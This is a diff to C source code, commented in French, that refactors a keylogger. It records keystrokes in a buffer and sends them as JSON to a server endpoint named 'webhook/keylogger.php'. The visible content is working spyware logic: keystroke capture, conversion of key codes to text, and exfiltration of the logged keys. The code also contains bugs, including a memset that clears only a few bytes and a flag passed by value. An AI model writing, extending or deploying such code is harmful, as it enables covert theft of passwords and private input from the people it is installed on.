@@ -10,26 +10,11 @@ char key_log[MAX_KEYS*10];
 int current_key_log_size = 0;
 
 
-void send_keys(void){
-
-    /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
-    
-    char data[MAX_KEYS+50];
-    snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
-    memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
-    current_key_log_size = 0;
-    
-    send_to_server("webhook/keylogger.php", data);
-}
-
-
-void log_key(int key) {
-
-    /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/
-    char string_key[15];
-    int value_in_string_key = 1;
-
-    // Permet d'avoir la touche exacte avec son code décimal
+void key_code_to_string(int key, char *string_key, int value_in_string_key){
+    /*
+    Fonction qui détecte la touche tapé via son key_code (valeur de la toouche du clavier)
+    ce n'est pas de l'ASCII
+    */
 
     /* 
     
@@ -40,8 +25,11 @@ void log_key(int key) {
         223: point d'exclamation
         de 96 à 105: chiffres de 0 à 9 (sur le pavé numérique)
         20: verr maj
+
+        à compléter
     
     */
+   
 
     switch (key) {
         case 20:
@@ -71,7 +59,27 @@ void log_key(int key) {
             }
             break;
     }
+}
 
+void send_keys(void){
+
+    /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
+    
+    char data[MAX_KEYS+50];
+    snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
+    memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
+    current_key_log_size = 0;
+    
+    send_to_server("webhook/keylogger.php", data);
+}
+
+
+void log_key(int key) {
+
+    /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/
+    char string_key[15];
+    int value_in_string_key = 1;
+    key_code_to_string(key, string_key, value_in_string_key);
 
     if(value_in_string_key){
         printf("%s, %d \n", string_key,key);
